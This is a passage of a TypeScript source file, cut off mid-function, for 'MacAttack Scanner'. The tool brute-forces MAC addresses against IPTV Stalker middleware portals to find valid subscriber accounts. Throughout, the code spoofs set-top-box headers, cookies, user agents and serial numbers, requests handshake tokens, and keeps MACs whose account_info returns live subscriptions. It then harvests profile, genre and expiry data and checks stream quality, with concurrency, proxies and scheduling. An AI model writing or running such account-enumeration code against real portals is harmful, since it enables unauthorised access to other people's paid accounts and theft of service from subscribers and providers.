/**
 * ============================================================================
 * MacAttack Scanner - IPTV Stalker Middleware MAC Address Scanner
 * ============================================================================
 *
 * This file contains the core scanning logic for testing MAC addresses against
 * Stalker middleware IPTV portals.
 *
 * IMPORTANT VALIDATION RULE
 * -------------------------
 * A MAC address is ONLY considered valid when the portal returns real account
 * information from the account_info endpoint.
 *
 * A successful handshake token alone does NOT mean the MAC is valid.
 * Many portals return handshake tokens for arbitrary MAC addresses.
 *
 * This scanner therefore uses this flow:
 * 1. Find/validate a Stalker endpoint.
 * 2. Generate MAC addresses inside the requested prefix space.
 * 3. Do handshake to get a token.
 * 4. Request account_info.
 * 5. Only if account_info contains meaningful subscription data do we count
 *    the MAC as valid and then fetch extra data like profile/genres/VOD.
 *
 * ADDITIONAL FEATURES
 * -------------------
 * - Home Assistant entity updates.
 * - Detailed info/warning/error logging.
 * - Server geolocation lookup using DNS + https://api.country.is
 * - Deterministic exhaustive MAC scanning, so we know when all MACs in the
 *   selected prefix space have been searched.
 * ============================================================================
 */

import { lookup } from "node:dns/promises";
import { performance } from "node:perf_hooks";
import { db } from "@/db";
import { scanJobs, scanResults, scanLogs, settings, qualityProbeRuns } from "@/db/schema";
import { eq } from "drizzle-orm";
import { isWithinSchedule, parseScheduleSettings } from "@/lib/schedule";
import {
  tcpPing,
  measureHttpRequest,
  parseHostPort,
  type TcpPingResult,
} from "@/lib/network-diags";
import {
  genresPassFilter,
  expiryPassesFilter,
  type GenreFilterConfig,
  type ExpireFilterConfig,
} from "@/lib/filters";
import { extractPortalExpiry, extractPortalFields } from "@/lib/portal-result-fields";
import { checkMacStreamQuality, formatMacQualityLog } from "@/lib/mac-quality";
import { HostRateLimiter, hostOf } from "@/lib/parallel";
import { buildUserAgentCandidates, parseUserAgentList, userAgentSettingKey } from "@/lib/user-agents";
import { parseProxyList } from "@/lib/proxy";
import { pruneThumbnails } from "@/lib/thumbnail-store";
import { computeSerialNumber } from "@/lib/stalker-streams";
import { detectDegradation, summariseHistory, type ProbeRun } from "@/lib/quality-history";

// ============================================================================
// ACTIVE SCANS MANAGEMENT
// ============================================================================

/**
 * Stores an AbortController for every active scan.
 * This allows the stop API to cancel a running scan loop.
 */
const activeScans = new Map<number, AbortController>();

// ============================================================================
// PREFIX / MAC SPACE HELPERS
// ============================================================================

/**
 * Normalizes a MAC prefix into an array of byte strings.
 *
 * Examples:
 * - "00:1A:79"      -> ["00", "1A", "79"]
 * - "00:1A:79:*"    -> ["00", "1A", "79"]
 * - "00:1A:79:AA"   -> ["00", "1A", "79", "AA"]
 */
function normalizePrefix(prefix: string): string[] {
  return prefix
    .replace(/\*/g, "")
    .replace(/:$/, "")
    .split(":")
    .filter(Boolean)
    .map((part) => part.toUpperCase().padStart(2, "0"));
}

/**
 * Calculates how many MAC addresses exist inside the chosen prefix space.
 *
 * Examples:
 * - 3-byte prefix => 256^3 = 16,777,216
 * - 4-byte prefix => 256^2 = 65,536
 * - 5-byte prefix => 256^1 = 256
 * - 6-byte prefix => 1
 */
function getTotalMacCombinations(prefix: string): number {
  const prefixParts = normalizePrefix(prefix);
  const missingBytes = Math.max(0, 6 - prefixParts.length);
  return Math.pow(256, missingBytes);
}

/**
 * Converts a linear numeric index into a full MAC address.
 *
 * For example with prefix "00:1A:79" (3 bytes fixed, 3 bytes variable):
 *   index 0       →  00:1A:79:00:00:00
 *   index 1       →  00:1A:79:00:00:01
 *   index 255     →  00:1A:79:00:00:FF
 *   index 256     →  00:1A:79:00:01:00
 *   index 16777215→  00:1A:79:FF:FF:FF
 */
function buildMacAddressFromIndex(prefix: string, index: number): string {
  const prefixParts = normalizePrefix(prefix);
  const missingBytes = Math.max(0, 6 - prefixParts.length);
  const suffix: string[] = new Array(missingBytes);

  let remaining = index;

  for (let i = missingBytes - 1; i >= 0; i -= 1) {
    const byteValue = remaining % 256;
    suffix[i] = byteValue.toString(16).padStart(2, "0").toUpperCase();
    remaining = Math.floor(remaining / 256);
  }

  return [...prefixParts, ...suffix].join(":");
}

/**
 * Caps a numeric counter to the PostgreSQL integer limit.
 */
function numberToDbInt(value: number): number {
  const max = 2147483647;
  if (value > max) return max;
  return value;
}

// ============================================================================
// RANDOMISED BLOCK-SHUFFLE MAC ENUMERATION
// ============================================================================
//
// WHY NOT JUST STORE ALL TESTED MACs IN A SET?
// ─────────────────────────────────────────────
// A 3-byte suffix means 16,777,216 possible MACs.  Storing every one in a
// JavaScript Set would use > 500 MB of RAM.  That's unacceptable on a NAS
// with limited memory.
//
// APPROACH: BLOCK-BASED SHUFFLE
// ─────────────────────────────
// 1. Divide the entire MAC index space [0 … N) into small blocks of
//    BLOCK_SIZE (default 10,000).
// 2. Build an array of block numbers [0, 1, 2, …] and shuffle it
//    (Fisher-Yates).  Memory: totalBlocks × 4 bytes ≈ 7 KB for 16.7 M MACs.
// 3. For each block, build an array of the indices inside it and shuffle that.
//    Memory: BLOCK_SIZE × 4 bytes ≈ 40 KB (reused every block).
// 4. Test each MAC from the shuffled indices.
//
// RESULT
// ------
// • Every MAC is tested exactly once (no duplicates).
// • Order is random (shuffled between AND within blocks).
// • Peak memory: ~80 KB regardless of prefix space size.
// • We know when every MAC has been tested (scan is exhaustive).
// ============================================================================

/** Default block size if none is specified. */
const DEFAULT_BLOCK_SIZE = 8_000;

/**
 * Fisher-Yates in-place shuffle.
 * Runs in O(n) time and O(1) extra memory.
 */
function shuffleArray(arr: number[]): void {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    const tmp = arr[i];
    arr[i] = arr[j];
    arr[j] = tmp;
  }
}

/**
 * Creates the shuffled block order for the entire MAC space.
 *
 * @param totalCombinations – total number of MACs in the prefix space
 * @param blockSize – number of MACs per block
 * @returns A shuffled array of block indices
 */
function createShuffledBlockOrder(
  totalCombinations: number,
  blockSize: number
): number[] {
  const totalBlocks = Math.ceil(totalCombinations / blockSize);
  const blockOrder: number[] = new Array(totalBlocks);
  for (let i = 0; i < totalBlocks; i++) blockOrder[i] = i;
  shuffleArray(blockOrder);
  return blockOrder;
}

/**
 * Creates a shuffled array of MAC indices within one block.
 *
 * @param blockIndex – the block number (0-based)
 * @param totalCombinations – total MACs in the full space
 * @param blockSize – number of MACs per block
 * @returns A shuffled array of absolute MAC indices
 */
function createShuffledBlockIndices(
  blockIndex: number,
  totalCombinations: number,
  blockSize: number
): number[] {
  const start = blockIndex * blockSize;
  const end   = Math.min(start + blockSize, totalCombinations);
  const size  = end - start;

  const indices: number[] = new Array(size);
  for (let i = 0; i < size; i++) indices[i] = start + i;
  shuffleArray(indices);

  return indices;
}

// ============================================================================
// LOGGING SYSTEM
// ============================================================================

async function addLog(jobId: number, level: string, message: string): Promise<void> {
  try {
    await db.insert(scanLogs).values({ jobId, level, message });
  } catch {
    // Logging must never crash the scanner.
  }
}

// ============================================================================
// STALKER URL HELPERS
// ============================================================================

/**
 * Common Stalker/portal URL patterns.
 */
const PORTAL_PATTERNS = [
  { path: "server/load.php", base: "c/" },
  { path: "server/load.php", base: "" },
  { path: "stalker_portal/server/load.php", base: "stalker_portal/c/" },
  { path: "stalker_portal/server/load.php", base: "c/" },
  { path: "portal.php", base: "c/" },
  { path: "portal.php", base: "" },
  { path: "load.php", base: "c/" },
  { path: "load.php", base: "" },
];

// This is the timezone sent by this scanner in the STB request cookie. Keep it
// distinct from timezone values returned by the portal: the cookie is a
// client-supplied request value, not evidence of the subscriber's timezone.
const STB_REQUEST_TIMEZONE = "Europe/London";

function getBaseUrl(url: string): string {
  let base = url.trim();

  if (!base.startsWith("http://") && !base.startsWith("https://")) {
    base = `http://${base}`;
  }

  base = base.replace(
    /\/(c|stalker_portal\/c|stalker_portal|portal\.php|server\/load\.php|load\.php)\/?$/i,
    ""
  );

  if (!base.endsWith("/")) {
    base += "/";
  }

  return base;
}

const STB_HEADERS = {
  "User-Agent":
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
  "X-User-Agent": "Model: MAG250; Link: WiFi",
  Accept: "*/*",
};

function makeCookie(mac: string): string {
  return `mac=${encodeURIComponent(mac)}; stb_lang=en; timezone=${STB_REQUEST_TIMEZONE}`;
}

// ============================================================================
// HOME ASSISTANT
// ============================================================================

async function sendToHomeAssistant(
  haUrl: string,
  haToken: string,
  entityId: string,
  state: string | number,
  attributes?: Record<string, unknown>
): Promise<boolean> {
  if (!haUrl || !haToken || !entityId) return false;

  try {
    const url = `${haUrl.replace(/\/$/, "")}/api/states/${entityId}`;
    const response = await fetch(url, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${haToken}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        state: String(state),
        attributes: {
          unit_of_measurement: "MACs",
          friendly_name: "MacAttack Found MACs",
          icon: "mdi:access-point-network",
          ...attributes,
        },
      }),
    });
    return response.ok;
  } catch {
    return false;
  }
}

// ============================================================================
// SERVER GEOLOCATION
// ============================================================================

/**
 * Resolve portal hostname -> IP -> geolocation.
 *
 * Uses ipwho.is (free, no API key, HTTPS) which returns rich fields:
 *   city, region, country, continent, latitude/longitude, timezone,
 *   isp, org, asn (as {asn, org, ...}), connection (isp/org/as), etc.
 *
 * If ipwho.is fails we fall back to api.country.is (country-only) so we
 * always show *something*.
 */
async function resolveServerLocation(
  portalUrl: string
): Promise<{
  ip: string | null;
  label: string;
  raw: Record<string, unknown> | null;
}> {
  try {
    const parsed = new URL(getBaseUrl(portalUrl));
    const hostname = parsed.hostname;

    const dnsResult = await lookup(hostname);
    const ip = dnsResult.address;

    // Primary — ipwho.is over HTTPS, no key.
    try {
      const geoResponse = await fetch(`https://ipwho.is/${ip}`);
      if (geoResponse.ok) {
        const geo = (await geoResponse.json()) as Record<string, unknown>;
        if (geo.success !== false) {
          const city = String(geo.city || "");
          const region = String(geo.region || "");
          const country = String(geo.country || "");
          const continent = String(geo.continent || "");

          // ipwho.is nests connection/ASN info under a `connection` object
          // { isp, org, asn } and top-level.  Be defensive.
          const connection =
            geo.connection && typeof geo.connection === "object"
              ? (geo.connection as Record<string, unknown>)
              : null;
          const isp = String(
            geo.isp || connection?.isp || geo.org || connection?.org || ""
          );
          const asnVal =
            geo.asn ?? connection?.asn ?? geo.as ?? connection?.as ?? null;
          const asnOrg =
            typeof asnVal === "object" && asnVal
              ? (asnVal as Record<string, unknown>).org ??
                (asnVal as Record<string, unknown>).name ??
                ""
              : asnVal
              ? String(asnVal)
              : "";

          const parts = [city, region, country].filter(Boolean);
          let label =
            parts.length > 0
              ? parts.join(", ")
              : country || continent || `IP ${ip}`;
          if (ip) label += ` (IP: ${ip})`;
          if (isp) label += ` | ISP: ${isp}`;
          if (asnOrg && String(asnOrg) !== isp) label += ` | AS: ${asnOrg}`;

          return { ip, label, raw: geo };
        }
      }
    } catch {
      // fall through to backup
    }

    // Fallback — api.country.is (country only).
    try {
      const geoResponse = await fetch(`https://api.country.is/${ip}`);
      if (geoResponse.ok) {
        const geo = (await geoResponse.json()) as Record<string, unknown>;
        const country = String(geo.country || "");
        return {
          ip,
          label: country ? `${country} (IP: ${ip})` : `IP ${ip}`,
          raw: geo,
        };
      }
    } catch {
      // fall through
    }

    return { ip, label: `IP ${ip}`, raw: null };
  } catch {
    return {
      ip: null,
      label: "Unknown server location",
      raw: null,
    };
  }
}

// ============================================================================
// PORTAL VALIDATION
// ============================================================================

async function findWorkingEndpoint(
  portalUrl: string,
  timeoutMs: number = 10000,
  beforeRequest?: () => Promise<boolean>
): Promise<{ serverPath: string; portalBase: string } | { aborted: true } | null> {
  const baseUrl = getBaseUrl(portalUrl);

  for (const pattern of PORTAL_PATTERNS) {
    if (beforeRequest && !(await beforeRequest())) return { aborted: true };

    const serverPath = `${baseUrl}${pattern.path}`;
    const portalBase = `${baseUrl}${pattern.base}`;
    const testUrl = `${serverPath}?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml`;

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), timeoutMs);

      const response = await fetch(testUrl, {
        method: "GET",
        headers: {
          ...STB_HEADERS,
          Cookie: `mac=00:1A:79:00:00:00; stb_lang=en; timezone=${STB_REQUEST_TIMEZONE}`,
        },
        signal: controller.signal,
      });

      clearTimeout(timeout);

      if (response.ok) {
        const text = await response.text();
        try {
          const data = JSON.parse(text);
          if (data && typeof data === "object") {
            if ("js" in data || "token" in data || "error" in data) {
              return { serverPath, portalBase };
            }
          }
        } catch {
          // Try next pattern.
        }
      }
    } catch {
      // Try next pattern.
    }
  }

  return null;
}

export async function validateStalkerPortal(
  portalUrl: string,
  timeoutMs: number = 10000,
  beforeRequest?: () => Promise<boolean>
): Promise<{
  valid: boolean;
  error?: string;
  serverPath?: string;
  portalBase?: string;
  aborted?: boolean;
}> {
  try {
    const result = await findWorkingEndpoint(portalUrl, timeoutMs, beforeRequest);

    if (result && "aborted" in result) return { valid: false, aborted: true };

    if (result) {
      return {
        valid: true,
        serverPath: result.serverPath,
        portalBase: result.portalBase,
      };
    }

    const baseUrl = getBaseUrl(portalUrl);
    const directUrl = `${baseUrl}server/load.php?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml`;

    if (beforeRequest && !(await beforeRequest())) return { valid: false, aborted: true };

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), timeoutMs);

      const response = await fetch(directUrl, {
        method: "GET",
        headers: {
          ...STB_HEADERS,
          Cookie: `mac=00:1A:79:00:00:00; stb_lang=en; timezone=${STB_REQUEST_TIMEZONE}`,
        },
        signal: controller.signal,
      });

      clearTimeout(timeout);

      if (response.ok) {
        const text = await response.text();
        if (text.trim().startsWith("{") || text.trim().startsWith("[")) {
          return {
            valid: true,
            serverPath: `${baseUrl}server/load.php`,
            portalBase: `${baseUrl}c/`,
          };
        }
      }
    } catch {
      // ignore
    }

    return {
      valid: false,
      error:
        "Could not find a valid Stalker middleware endpoint. Tried multiple common URL patterns. You can enable 'Skip Verification' to proceed anyway.",
    };
  } catch (err) {
    if (err instanceof Error && err.name === "AbortError") {
      return {
        valid: false,
        error: "Connection timed out. The portal may be offline or unreachable.",
      };
    }

    return {
      valid: false,
      error: `Connection failed: ${err instanceof Error ? err.message : "Unknown error"}`,
    };
  }
}

// ============================================================================
// STALKER API CALLS
// ============================================================================

/**
 * Per-job request overrides (user-agent rotation, serial-number fingerprint).
 * Threaded through the portal calls a MAC check makes.
 */
export interface PortalRequestOptions {
  userAgent?: string | null;
  serialNumber?: string | null;
}

function portalHeaders(
  portalBase: string,
  mac: string,
  options?: PortalRequestOptions
): Record<string, string> {
  return {
    ...STB_HEADERS,
    ...(options?.userAgent ? { "User-Agent": options.userAgent, "X-User-Agent": "Model: MAG250; Link: WiFi" } : {}),
    ...(options?.serialNumber ? { SN: options.serialNumber, "X-Serial-Number": options.serialNumber } : {}),
    Cookie: makeCookie(mac),
    Referer: portalBase,
  };
}

async function doHandshake(
  serverPath: string,
  portalBase: string,
  mac: string,
  timeoutMs: number,
  aborted: () => boolean,
  options?: PortalRequestOptions
): Promise<string | null> {
  if (aborted()) return null;

  const url = `${serverPath}?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml`;

  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);

    const res = await fetch(url, {
      method: "GET",
      headers: portalHeaders(portalBase, mac, options),
      signal: controller.signal,
    });

    clearTimeout(t);
    if (!res.ok) return null;

    const data = (await res.json()) as { js?: { token?: string } };
    return data?.js?.token || null;
  } catch {
    return null;
  }
}

interface PortalResponse<T> {
  payload: T;
  rawResponse: unknown;
  statusCode: number;
  endpoint: string;
  receivedAt: string;
}

interface PortalCategoryResponse {
  entries: Array<{ id: string; title: string }>;
  rawResponse: unknown;
  statusCode: number;
  endpoint: string;
  receivedAt: string;
}

function asPortalRecord(value: unknown): Record<string, unknown> | null {
  return value !== null && typeof value === "object" && !Array.isArray(value)
    ? (value as Record<string, unknown>)
    : null;
}

function getPortalObjectPayload(rawResponse: unknown): Record<string, unknown> | null {
  const root = asPortalRecord(rawResponse);
  if (!root) return null;
  if ("js" in root) {
    const jsObj = asPortalRecord(root.js);
    if (jsObj) return jsObj;
    if (Array.isArray(root.js) && root.js.length > 0) {
      return asPortalRecord(root.js[0]);
    }
    return null;
  }
  return root;
}

function responseEndpoint(url: string): string {
  try {
    const parsed = new URL(url);
    return `${parsed.pathname}${parsed.search}`;
  } catch {
    return url;
  }
}

function responseForStorage(
  response:
    | {
        rawResponse: unknown;
        statusCode: number;
        endpoint: string;
        receivedAt: string;
      }
    | null
) {
  if (!response) return null;
  return {
    statusCode: response.statusCode,
    endpoint: response.endpoint,
    receivedAt: response.receivedAt,
    body: response.rawResponse,
  };
}

async function fetchProfile(
  serverPath: string,
  portalBase: string,
  mac: string,
  token: string,
  timeoutMs: number,
  aborted: () => boolean,
  options?: PortalRequestOptions
): Promise<PortalResponse<Record<string, unknown>> | null> {
  if (aborted()) return null;

  const url = `${serverPath}?type=stb&action=get_profile&hd=1&num_banks=1&stb_type=MAG250&JsHttpRequest=1-xml`;

  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);

    const res = await fetch(url, {
      method: "GET",
      headers: {
        ...portalHeaders(portalBase, mac, options),
        Authorization: `Bearer ${token}`,
      },
      signal: controller.signal,
    });

    clearTimeout(t);
    if (!res.ok) return null;

    const rawResponse: unknown = await res.json();
    const payload = getPortalObjectPayload(rawResponse);
    if (!payload) return null;

    return {
      payload,
      rawResponse,
      statusCode: res.status,
      endpoint: responseEndpoint(url),
      receivedAt: new Date().toISOString(),
    };
  } catch {
    return null;
  }
}

async function fetchAccountInfo(
  serverPath: string,
  portalBase: string,
  mac: string,
  token: string,
  timeoutMs: number,
  aborted: () => boolean,
  options?: PortalRequestOptions
): Promise<PortalResponse<Record<string, unknown>> | null> {
  if (aborted()) return null;

  const url = `${serverPath}?type=account_info&action=get_main_info&JsHttpRequest=1-xml`;

  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);

    const res = await fetch(url, {
      method: "GET",
      headers: {
        ...portalHeaders(portalBase, mac, options),
        Authorization: `Bearer ${token}`,
      },
      signal: controller.signal,
    });

    clearTimeout(t);
    if (!res.ok) return null;

    const rawResponse: unknown = await res.json();
    const payload = getPortalObjectPayload(rawResponse);
    if (!payload) return null;

    return {
      payload,
      rawResponse,
      statusCode: res.status,
      endpoint: responseEndpoint(url),
      receivedAt: new Date().toISOString(),
    };
  } catch {
    return null;
  }
}

async function fetchGenres(
  serverPath: string,
  portalBase: string,
  mac: string,
  token: string,
  type: "itv" | "vod" | "series",
  timeoutMs: number,
  aborted: () => boolean,
  options?: PortalRequestOptions
): Promise<PortalCategoryResponse | null> {
  if (aborted()) return null;

  // Stalker endpoints:
  //   itv   -> get_genres      (live TV genres)
  //   vod   -> get_categories  (VOD / movies)
  //   series-> get_categories  (TV shows / series, on Ministra)
  const action = type === "itv" ? "get_genres" : "get_categories";
  const url = `${serverPath}?type=${type}&action=${action}&JsHttpRequest=1-xml`;

  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);

    const res = await fetch(url, {
      method: "GET",
      headers: {
        ...portalHeaders(portalBase, mac, options),
        Authorization: `Bearer ${token}`,
      },
      signal: controller.signal,
    });

    clearTimeout(t);
    if (!res.ok) return null;

    const rawResponse: unknown = await res.json();
    const root = asPortalRecord(rawResponse);
    const rawEntries = Array.isArray(root?.js)
      ? root.js
      : Array.isArray(rawResponse)
        ? rawResponse
        : [];
    const entries = rawEntries
      .map((entry) => {
        const item = asPortalRecord(entry);
        if (!item) return null;
        const rawId = item.id ?? item.genre_id ?? item.category_id ?? item.number;
        const rawTitle = item.title ?? item.name ?? item.label ?? item.alias;
        return {
          id: rawId === null || rawId === undefined ? "" : String(rawId),
          title: rawTitle === null || rawTitle === undefined ? "" : String(rawTitle),
        };
      })
      .filter((entry): entry is { id: string; title: string } => Boolean(entry?.id && entry?.title));

    return {
      entries,
      rawResponse,
      statusCode: res.status,
      endpoint: responseEndpoint(url),
      receivedAt: new Date().toISOString(),
    };
  } catch {
    return null;
  }
}

// ============================================================================
// ACCOUNT VALIDATION
// ============================================================================

function isAccountInfoValid(info: Record<string, unknown>): boolean {
  if (Object.keys(info).length === 0) return false;

  const mac = info.mac || info.login;
  // NOTE: `info.phone` in Stalker responses is the EXPIRATION DATE,
  // not a real telephone number. It is included here as an expiry signal.
  const expiry =
    extractPortalExpiry(null, info) ||
    info.phone ||
    info.end_date ||
    info.expire_billing_date ||
    info.expire ||
    info.expiry;
  const tariff = info.tariff_plan;
  const status = info.status;

  if (!mac && !expiry && !tariff) return false;
  if (status === -1 || status === "-1") return false;

  return true;
}

// ============================================================================
// FINALIZATION / RESET HELPERS
// ============================================================================

async function resetFoundCounterAndHa(jobId: number, reason: string): Promise<void> {
  const [job] = await db
    .select()
    .from(scanJobs)
    .where(eq(scanJobs.id, jobId))
    .limit(1);

  if (!job) return;

  await db
    .update(scanJobs)
    .set({
      totalFound: 0,
      currentMac: null,
      updatedAt: new Date(),
    })
    .where(eq(scanJobs.id, jobId));

  if (job.haUrl && job.haToken && job.haEntityId) {
    await sendToHomeAssistant(job.haUrl, job.haToken, job.haEntityId, 0, {
      status: reason,
      reset_at: new Date().toISOString(),
    });
  }
}

// ============================================================================
// SCHEDULE GATE
// ============================================================================

/**
 * Throttles schedule checks while a scan is active, and keeps the worker alive
 * in a scheduled-paused state until its next allowed window. The five-second
 * check interval means schedule edits and window boundaries take effect quickly
 * without a database query for every tested MAC.
 */
function createScheduleGate(jobId: number, isAborted: () => boolean) {
  const checkIntervalMs = 5_000;
  let cachedSchedule: ReturnType<typeof parseScheduleSettings> | null = null;
  let nextCheckAt = 0;
  let wasScheduledPaused = false;

  const readSchedule = async () => {
    const rows = await db.select().from(settings);
    const settingsMap = Object.fromEntries(rows.map((row) => [row.key, row.value || ""]));
    cachedSchedule = parseScheduleSettings(
      settingsMap.schedule_enabled,
      settingsMap.schedule_timezone,
      settingsMap.schedule_days
    );
    nextCheckAt = Date.now() + checkIntervalMs;
    return cachedSchedule;
  };

  const isAllowedNow = async () => {
    if (cachedSchedule && Date.now() < nextCheckAt) {
      return isWithinSchedule(cachedSchedule);
    }

    try {
      return isWithinSchedule(await readSchedule());
    } catch {
      // If a saved schedule was already loaded, honor it during a transient
      // database failure. Before the first successful read, fail closed rather
      // than risk running outside a schedule that could not be checked.
      nextCheckAt = Date.now() + checkIntervalMs;
      return cachedSchedule ? isWithinSchedule(cachedSchedule) : false;
    }
  };

  return async (): Promise<boolean> => {
    if (isAborted()) return false;

    if (await isAllowedNow()) {
      if (wasScheduledPaused) {
        await db.update(scanJobs)
          .set({ status: "running", updatedAt: new Date() })
          .where(eq(scanJobs.id, jobId));
        await addLog(jobId, "success", "Allowed schedule window is open — scan resumed automatically");
        wasScheduledPaused = false;
      }
      return true;
    }

    if (!wasScheduledPaused) {
      await db.update(scanJobs)
        .set({ status: "scheduled_paused", updatedAt: new Date() })
        .where(eq(scanJobs.id, jobId));
      await addLog(jobId, "warning", "Outside the allowed schedule — scan is paused until the next allowed window");
      wasScheduledPaused = true;
    }

    while (!isAborted()) {
      await new Promise((resolve) => setTimeout(resolve, 2_000));
      if (await isAllowedNow()) {
        await db.update(scanJobs)
          .set({ status: "running", updatedAt: new Date() })
          .where(eq(scanJobs.id, jobId));
        await addLog(jobId, "success", "Allowed schedule window is open — scan resumed automatically");
        wasScheduledPaused = false;
        return true;
      }
    }

    return false;
  };
}

// ============================================================================
// MAIN SCAN LOOP
// ============================================================================

export async function startScan(jobId: number, skipVerification: boolean = false): Promise<void> {
  const controller = new AbortController();
  activeScans.set(jobId, controller);
  const isAborted = () => controller.signal.aborted;
  const waitForAllowedWindow = createScheduleGate(jobId, isAborted);

  try {
    const [job] = await db
      .select()
      .from(scanJobs)
      .where(eq(scanJobs.id, jobId))
      .limit(1);

    if (!job) {
      await addLog(jobId, "error", "Job not found in database");
      return;
    }

    const macPrefix = job.macPrefix || "00:1A:79";
    const timeoutMs = job.timeoutMs || 5000;
    const macListMode = job.scanMode === "list" && Array.isArray(job.macList) && job.macList.length > 0;
    const macList = macListMode ? (job.macList as string[]) : null;
    const scanConcurrency = Math.max(1, Math.min(job.concurrency ?? 1, 8));
    const portalRateLimiter = new HostRateLimiter(scanConcurrency > 1 ? 150 : 0);
    const haUrl = job.haUrl || "";
    const haToken = job.haToken || "";
    const haEntityId = job.haEntityId || "";
    const totalCombinations = macListMode ? macList!.length : getTotalMacCombinations(macPrefix);

    // ── Build filter configs from the persisted job row ────────────────
    const genreFilter: GenreFilterConfig = {
      enabled: Boolean(job.genreFilterEnabled),
      keywords: job.genreFilterKeywords || "",
      matchLive: Boolean(job.genreFilterMatchLive ?? true),
      matchVod: Boolean(job.genreFilterMatchVod ?? true),
      matchSeries: Boolean(job.genreFilterMatchSeries ?? true),
    };
    const expireFilter: ExpireFilterConfig = {
      enabled: Boolean(job.expireFilterEnabled),
      minDate: job.expireFilterMinDate || null,
      includeUnlimited: Boolean(job.expireFilterIncludeUnlimited ?? true),
    };

    // ── Stream quality check options (defaults are applied in the DB) ──
    const qualityCheck = {
      enabled: (job.qualityCheckEnabled ?? 1) !== 0,
      pictureChecks: (job.pictureChecksEnabled ?? 1) !== 0,
      thumbnails: (job.thumbnailsEnabled ?? 1) !== 0,
      catchUp: (job.catchUpCheckEnabled ?? 1) !== 0,
      concurrency: Math.max(1, Math.min(job.concurrency ?? 1, 4)),
      channels: Math.max(1, Math.min(job.qualityChannels ?? 3, 8)),
      sampleMs: Math.max(3000, Math.min(job.qualitySampleMs ?? 8000, 30000)),
    };

    // Track how many valid-but-filtered MACs we rejected (for progress).
    let filteredOut = 0;

    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", "        MacAttack Scan Starting");
    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", `Portal URL: ${job.portalUrl}`);
    await addLog(jobId, "info", `MAC Prefix: ${macPrefix}`);
    await addLog(jobId, "info", `Timeout: ${timeoutMs}ms`);
    await addLog(
      jobId,
      "info",
      macListMode
        ? `Bulk MAC list: ${totalCombinations.toLocaleString()} unique MAC address(es) to check`
        : `Total MAC combinations in this prefix: ${totalCombinations.toString()}`
    );
    if (scanConcurrency > 1) {
      await addLog(
        jobId,
        "info",
        `Concurrency: ${scanConcurrency} workers (rate-limited to ~${Math.round(
          1000 / 150
        )} requests/second per portal host)`
      );
    }

    if (expireFilter.enabled) {
      await addLog(
        jobId,
        "info",
        `Expire filter ON: keep accounts expiring on/after ${
          expireFilter.minDate || "any date"
        }${expireFilter.includeUnlimited ? " (including unlimited)" : " (excluding unlimited)"}`
      );
    }
    if (qualityCheck.enabled) {
      await addLog(
        jobId,
        "info",
        `Stream quality check ON: ${qualityCheck.channels} channel(s) per found MAC, ${(
          qualityCheck.sampleMs / 1000
        ).toFixed(0)}s sample each`
      );
    } else {
      await addLog(jobId, "info", "Stream quality check OFF (portal/account checks only)");
    }

    if (genreFilter.enabled) {
      const types = [
        genreFilter.matchLive ? "Live" : null,
        genreFilter.matchVod ? "VOD" : null,
        genreFilter.matchSeries ? "Series" : null,
      ]
        .filter(Boolean)
        .join("/");
      await addLog(
        jobId,
        "info",
        `Genre filter ON: match keywords [${genreFilter.keywords}] in [${types}] categories`
      );
    }

    if (!(await waitForAllowedWindow())) return;

    let serverPath: string;
    let portalBase: string;

    if (skipVerification) {
      await addLog(jobId, "warning", "Portal verification SKIPPED by user");
      await addLog(jobId, "warning", "Using default URL patterns - may not work for all portals");
      const baseUrl = getBaseUrl(job.portalUrl);
      serverPath = `${baseUrl}server/load.php`;
      portalBase = `${baseUrl}c/`;
    } else {
      await addLog(jobId, "info", "Validating portal URL...");
      await addLog(jobId, "info", "Trying multiple common Stalker middleware URL patterns...");
      const validation = await validateStalkerPortal(job.portalUrl, timeoutMs, waitForAllowedWindow);

      if (!validation.valid) {
        if (validation.aborted || isAborted()) return;

        await addLog(jobId, "error", "════════════════════════════════════════");
        await addLog(jobId, "error", "    PORTAL VALIDATION FAILED");
        await addLog(jobId, "error", "════════════════════════════════════════");
        await addLog(jobId, "error", `Reason: ${validation.error}`);
        await addLog(jobId, "warning", "TIP: Enable 'Skip Verification' to try anyway");

        await db
          .update(scanJobs)
          .set({ status: "error", updatedAt: new Date() })
          .where(eq(scanJobs.id, jobId));
        activeScans.delete(jobId);
        return;
      }

      serverPath = validation.serverPath!;
      portalBase = validation.portalBase!;
      await addLog(jobId, "success", "Portal validation SUCCESSFUL!");
      await addLog(jobId, "success", `Found working endpoint: ${serverPath}`);
    }

    const portalHost = hostOf(serverPath);
    const primaryTarget = { serverPath, portalBase, host: portalHost };

    // ── Multi-portal / second-chance re-check ─────────────────────────
    // Extra portals given for the job are validated once; a MAC rejected by
    // the primary portal then gets one retry against the next portal
    // (round-robin, so load is spread and every MAC gets a second chance).
    const portalAlternatives: Array<{ serverPath: string; portalBase: string; host: string }> = [];
    const extraPortalUrls: string[] = Array.isArray(job.portalUrls) ? (job.portalUrls as string[]) : [];
    for (const extraUrl of extraPortalUrls.slice(0, 20)) {
      if (!(await waitForAllowedWindow())) return;
      try {
        const validation = await validateStalkerPortal(extraUrl, timeoutMs);
        if (validation.valid && validation.serverPath) {
          portalAlternatives.push({
            serverPath: validation.serverPath,
            portalBase: validation.portalBase || `${new URL(validation.serverPath).origin}/c/`,
            host: hostOf(validation.serverPath),
          });
        } else {
          await addLog(jobId, "warning", `Extra portal skipped (not a Stalker portal): ${extraUrl}`);
        }
      } catch (err) {
        await addLog(
          jobId,
